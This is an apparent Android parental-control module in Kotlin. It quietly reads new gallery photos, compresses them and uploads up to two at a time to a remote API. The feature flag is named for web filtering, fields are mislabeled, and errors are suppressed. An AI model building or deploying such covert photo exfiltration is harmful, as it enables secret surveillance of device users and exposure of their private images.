package com.souly.parental.shield.services

import android.Manifest
import android.content.ContentUris
import android.content.Context
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.os.Build
import android.provider.MediaStore
import androidx.core.content.ContextCompat
import com.souly.parental.shield.data.prefs.SecureTokenStore
import com.souly.parental.shield.data.remote.SoulyApiClient
import okhttp3.MediaType.Companion.toMediaTypeOrNull
import okhttp3.MultipartBody
import okhttp3.RequestBody.Companion.toRequestBody
import java.io.ByteArrayOutputStream

class MediaGalleryBackupManager(private val context: Context) {

    private val tokenStore = SecureTokenStore(context.applicationContext)

    suspend fun syncRecentGalleryImagesIfPermitted() {
        if (!tokenStore.isDevicePaired() || !tokenStore.isFeatureEnabled("web_filter_media_backup")) return

        val hasMediaPerm = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            ContextCompat.checkSelfPermission(context, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
        } else {
            ContextCompat.checkSelfPermission(context, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
        }
        if (!hasMediaPerm) return

        val lastMediaId = tokenStore.getLastBackedUpMediaId()
        var newestMediaId = lastMediaId

        try {
            val projection = arrayOf(
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.BUCKET_DISPLAY_NAME
            )
            val cursor = context.contentResolver.query(
                MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                projection,
                "${MediaStore.Images.Media._ID} > ?",
                arrayOf(lastMediaId.toString()),
                "${MediaStore.Images.Media._ID} DESC"
            )

            val api = SoulyApiClient.create(context)
            val textPlain = "text/plain".toMediaTypeOrNull()

            cursor?.use { c ->
                val idIdx = c.getColumnIndex(MediaStore.Images.Media._ID)
                val nameIdx = c.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME)
                val bucketIdx = c.getColumnIndex(MediaStore.Images.Media.BUCKET_DISPLAY_NAME)

                var uploadedCount = 0
                while (c.moveToNext() && uploadedCount < 2) {
                    val mediaId = if (idIdx >= 0) c.getLong(idIdx) else continue
                    val displayName = if (nameIdx >= 0) c.getString(nameIdx) ?: "image_$mediaId.webp" else "image_$mediaId.webp"
                    val bucketName = if (bucketIdx >= 0) c.getString(bucketIdx) ?: "Gallery" else "Gallery"

                    if (mediaId > newestMediaId) {
                        newestMediaId = mediaId
                    }

                    val uri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, mediaId)
                    val webpBytes = compressImageUriToWebp(uri) ?: continue

                    val reqFile = webpBytes.toRequestBody("image/webp".toMediaTypeOrNull())
                    val part = MultipartBody.Part.createFormData("file", displayName, reqFile)

                    api.uploadActivitySnapshot(
                        file = part,
                        uploadCategory = "recent_copy".toRequestBody(textPlain),
                        foregroundAppName = bucketName.toRequestBody(textPlain),
                        captureReason = "نسخة احتياطية آمنة للوسائط الحديثة".toRequestBody(textPlain),
                        fileName = displayName.toRequestBody(textPlain),
                        sourceFolder = bucketName.toRequestBody(textPlain)
                    )
                    uploadedCount++
                }
            }

            if (newestMediaId > lastMediaId) {
                tokenStore.saveLastBackedUpMediaId(newestMediaId)
            }
        } catch (e: Exception) {
        }
    }

    private fun compressImageUriToWebp(uri: android.net.Uri): ByteArray? {
        return try {
            val opts = BitmapFactory.Options().apply {
                inSampleSize = 2
            }
            val bmp = context.contentResolver.openInputStream(uri)?.use { input ->
                BitmapFactory.decodeStream(input, null, opts)
            } ?: return null

            val bos = ByteArrayOutputStream()
            val format = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) Bitmap.CompressFormat.WEBP_LOSSY else Bitmap.CompressFormat.WEBP
            bmp.compress(format, 75, bos)
            bmp.recycle()
            bos.toByteArray()
        } catch (e: Exception) {
            null
        }
    }
}
